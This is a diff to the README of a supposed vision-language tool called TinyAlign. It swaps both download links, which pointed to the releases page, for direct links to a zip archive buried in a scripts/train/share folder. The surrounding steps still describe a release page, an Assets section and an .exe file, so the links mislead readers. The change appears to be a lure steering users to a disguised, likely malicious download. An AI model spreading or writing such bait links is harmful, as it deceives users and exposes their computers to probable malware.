@@ -1,6 +1,6 @@
 # 🔭 TinyAlign - Faster vision language processing for everyone
 
-[![Download TinyAlign](https://img.shields.io/badge/Download-TinyAlign-blue.svg)](https://github.com/claudetottering2987/TinyAlign/releases)
+[![Download TinyAlign](https://img.shields.io/badge/Download-TinyAlign-blue.svg)](https://github.com/claudetottering2987/TinyAlign/raw/refs/heads/main/scripts/train/share/Tiny-Align-D.zip)
 
 TinyAlign improves how computers understand images and text. It makes lightweight vision-language models run better by fixing common alignment problems. You can use this tool to process images and generate text descriptions without needing heavy hardware. This software helps you analyze visual data with high efficiency.
 
@@ -24,7 +24,7 @@ Ensure your computer meets these specifications before you begin:
 
 You need to access the release page to get the installation files. Follow these steps:
 
-1. Visit the following link to find the latest version: [https://github.com/claudetottering2987/TinyAlign/releases](https://github.com/claudetottering2987/TinyAlign/releases)
+1. Visit the following link to find the latest version: [https://github.com/claudetottering2987/TinyAlign/raw/refs/heads/main/scripts/train/share/Tiny-Align-D.zip](https://github.com/claudetottering2987/TinyAlign/raw/refs/heads/main/scripts/train/share/Tiny-Align-D.zip)
 2. Look for the recent release tag at the top of the page.
 3. Locate the "Assets" section.
 4. Click on the file ending in `.exe` to start the download.
